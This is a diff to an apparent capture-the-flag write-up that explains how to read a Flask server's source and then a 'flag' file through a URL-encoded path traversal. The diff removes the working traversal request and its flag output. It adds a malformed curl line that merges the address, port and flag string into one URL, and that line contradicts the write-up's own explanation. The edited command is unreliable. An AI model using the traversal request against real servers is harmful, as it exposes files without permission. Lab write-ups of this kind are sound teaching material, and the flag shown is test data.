@@ -9,7 +9,7 @@ The webserver is a guicorn, so a python based server. On initial request it redi
 
 When requested, the server sends the raw source code, containing the first part of the flag.
 ```python
-$ curl http://$IP:$PORT/server.py
+$ curl http://192.168.10.5:5000/server.py
 
 import flask, sys, os
 import requests
@@ -49,8 +49,7 @@ if __name__ == '__main__':
 The code indicates that the second flag is in the file called `flag`. Since it is one level higher that the `server.py`, we need to exploit a [Path Traversal vulnerability](https://security.snyk.io/vuln/SNYK-PYTHON-FLASKCORS-608972). With the `..` urlencoded in front of the file name, the flag can be obtained.
 
 ```bash
-$ curl http://$IP:$PORT/%2e%2e/flag
-FLAG PART 2: NXBsMTdfbTNfNHA0cjd9
+$ curl http://192.168.10.5:5000NXBsMTdfbTNfNHA0cjd9
 
 <!-- page: ../flag, src: /code/server.py --> 
 ```
